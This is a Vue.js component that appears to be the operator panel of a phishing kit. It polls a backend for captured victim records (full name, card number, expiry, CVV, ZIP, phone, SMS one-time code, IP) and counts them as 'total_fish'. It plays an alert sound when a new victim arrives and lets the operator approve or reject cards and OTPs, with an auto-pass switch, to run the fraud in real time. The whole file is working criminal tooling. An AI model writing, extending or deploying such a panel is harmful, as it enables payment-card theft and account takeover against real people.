<template>
  <div>
    <div class="wrap">
      <audio id="audioMusic" class="audio" src="@/assets/tips.wav" controls autoplay="autoplay" hidden="true"
             ref="audio"></audio>
    </div>
    <v-banner
        v-show="false"
        color="brown lighten-4"
        elevation="12"
        icon="mdi-fish"
        rounded
        class="mb-5"
    >
      
      <v-chip dark color="cyan" label outlined link class="ml-2 mr-5" @click="show_delete_dialog=true">{{
          total_view
        }}
      </v-chip>
      
      <v-chip dark color="pink" label outlined class="ml-2">{{
          total_fish
        }}
      </v-chip>
      <v-dialog v-model="show_delete_dialog" max-width="400px">
        <v-card>
          <v-card-title class="text-h5">?</v-card-title>
          <v-card-actions>
            <v-spacer></v-spacer>
            <v-btn color="blue darken-1" text @click="dialogDelete=false"></v-btn>
            <v-spacer></v-spacer>
            <v-btn color="red" text @click="delete_visit"></v-btn>
            <v-spacer></v-spacer>
          </v-card-actions>
        </v-card>
      </v-dialog>
    </v-banner>

    <v-card class="px-5">
      <v-card-title>
         {{ desserts.length }}
        <v-spacer></v-spacer>
        <v-text-field
            v-model="search"
            append-icon="mdi-magnify"
            label="Search"
            single-line
            hide-details
        ></v-text-field>
      </v-card-title>
      <v-data-table
          :search="search"
          v-model="selected"
          :headers="headers"
          :items="desserts"
          :items-per-page="50"
          class="elevation-1"
          item-key="id"
          show-select
          checkbox-color="indigo"
      >
        <template v-slot:[`item.card_action`]="props">
          <v-btn
              dark
              small
              class="mr-5"
              color="green"
              @click="let_card_pass(props.item.id,'')"
          >
            
          </v-btn>
          <v-btn
              dark
              color="red"
              small
              @click="let_card_pass(props.item.id,'')"
          >
            
          </v-btn>
        </template>
        <template v-slot:[`item.sms_action`]="props">
          <v-btn
              dark
              small
              class="mr-5"
              color="green"
              @click="let_sms_pass(props.item.id,'')"
          >
            
          </v-btn>
          <v-btn
              dark
              color="red"
              small
              class="mr-5"
              @click="let_sms_pass(props.item.id,'')"
          >
            
          </v-btn>
          <!--          <v-btn-->
          <!--              dark-->
          <!--              color="amber darken-4"-->
          <!--              small-->
          <!--              @click="let_sms_pass(props.item.id,'')"-->
          <!--          >-->
          <!--            -->
          <!--          </v-btn>-->
        </template>
        <template v-slot:top>
          <v-switch
              v-model="auto_pass_card"
              label=""
              class="pa-3"
          ></v-switch>
        </template>
      </v-data-table>
      <div class="text-right pt-10 pb-2 pr-5">
        <v-btn color="blue" dark class="mr-5" @click="get_all_data"></v-btn>
        <v-btn color="red" dark @click="delete_data"></v-btn>
      </div>
    </v-card>
    <v-snackbar
        v-model="snack"
        :timeout="3000"
        top
        :color="snackColor"
    >
      <div class="text-center">{{ snackText }}</div>
    </v-snackbar>
  </div>
</template>

<script>
import axios from 'axios'
import api from '@/api/index'

export default {
  name: "data_manage",
  // ['ID','',"","","","IP",""]
  data: () => ({
    total_view: 0,
    total_fish: 0,
    auto_pass_card: false,
    change_status: ['', ''],
    snack: false,
    snackColor: '',
    snackText: '',
    search: '',
    dialogDelete: false,
    show_delete_dialog: false,
    selected: [],
    last_data: '',
    first_visit: true,
    headers: [{
      text: 'ID',
      align: 'start',
      value: 'id'
    },
      {text: '', value: 'status'},
      {text: '', value: 'full_name'},
      {text: '', value: 'card_number'},
      {text: '', value: 'exp_date'},
      {text: 'CVV', value: 'cvv'},
      {text: '', value: 'zip'},
      {text: '', value: 'phonenumber'},
      {text: '', value: 'card_action', align: 'center',},
      {text: '', value: 'otp'},
      {text: '', value: 'sms_action', align: 'center',},
      {text: 'IP', value: 'ip'},
      {text: '', value: 'time'},
    ],
    desserts: []
  }),
  methods: {
    musicAutoPlay() {
      this.isPlay = true;
    },
    save(row) {
      this.let_pass(row['id'], row['status'])
    },
    cancel() {
      this.snack = true
      this.snackColor = 'error'
      this.snackText = ''
    },
    get_all_data() {
      // this.get_visit()
      const url = api.get_data
      axios.get(url)
          .then(response => {
            if (response.data !== 'error') {
              this.desserts = []
              for (let i in response.data.all_data) {
                if (response.data.all_data[i]['card_number'] !== null) {
                  let card_number = response.data.all_data[i]['card_number']
                  response.data.all_data[i]['card_number'] = card_number.slice(0, 4) + '-' + card_number.slice(4, 8) + '-' + card_number.slice(8, 12) + '-' + card_number.slice(12, card_number.length)
                  this.desserts.push(response.data.all_data[i])
                }
                this.total_fish = this.desserts.length
              }
              if (this.first_visit === true) {
                this.first_visit = false
                this.last_data = this.desserts.length
              } else {
                if (this.last_data < this.desserts.length) {
                  console.log(this.last_data,this.desserts.length)
                  document.getElementById('audioMusic').play();
                }
              }
              this.last_data = this.desserts.length
              this.snack = true
              this.snackColor = 'success'
              this.snackText = ''
              this.auto_pass()
            } else {
              this.snack = true
              this.snackColor = 'error'
              this.snackText = ''
            }
          })
    },
    let_card_pass(id, status) {
      const url = api.set_card
      const params = new URLSearchParams();
      params.append('id', id)
      params.append('status', status)
      axios.post(url, params)
          .then(response => {
            if (response.data === 'ok') {
              this.snack = true
              this.snackColor = 'success'
              this.snackText = ''
            } else {
              this.snack = true
              this.snackColor = 'error'
              this.snackText = ''
            }
          })
    },
    let_sms_pass(id, status) {
      const url = api.set_otp
      const params = new URLSearchParams();
      params.append('id', id)
      params.append('status', status)
      axios.post(url, params)
          .then(response => {
            if (response.data === 'ok') {
              this.snack = true
              this.snackColor = 'success'
              this.snackText = ''
            } else {
              this.snack = true
              this.snackColor = 'error'
              this.snackText = ''
            }
          })
    },
    delete_data() {
      if (this.selected.length <= 0) {
        this.snack = true
        this.snackColor = 'error'
        this.snackText = ''
      } else {
        let i;
        let id;
        for (i in this.selected) {
          id = this.selected[i]["id"].toString() + ',' + id
        }
        id = id.replace(',undefined', '')
        const url = '/delete_data'
        const params = new URLSearchParams();
        params.append('id', id)
        axios.post(url, params)
            .then(response => {
              if (response.data === 'ok') {
                this.snack = true
                this.snackColor = 'success'
                this.snackText = ''
                this.get_all_data()
              } else {
                this.snack = true
                this.snackColor = 'error'
                this.snackText = ''
              }
            })
      }

    },
    loop_task() {
      setInterval(this.get_all_data, 10000);
    },
    auto_pass() {
      if (this.auto_pass_card === true) {
        for (let i in this.desserts) {
          if (this.desserts[i].status === "") {
            this.let_card_pass(this.desserts[i].id, '')
          }
        }
      }
    },
    // get_visit() {
    //   const url = '/api/get_visit_all'
    //   axios.get(url)
    //       .then(response => {
    //         this.total_view = response.data
    //       })
    // },
    // delete_visit() {
    //   const url = '/api/delet_visit_records'
    //   axios.get(url)
    //       .then(this.get_visit)
    //   this.show_delete_dialog = false
    // },
  },
  mounted() {
    this.get_all_data()
    this.loop_task()
    window.addEventListener("click", this.musicAutoPlay);

  }
}

</script>

<style scoped>

</style>
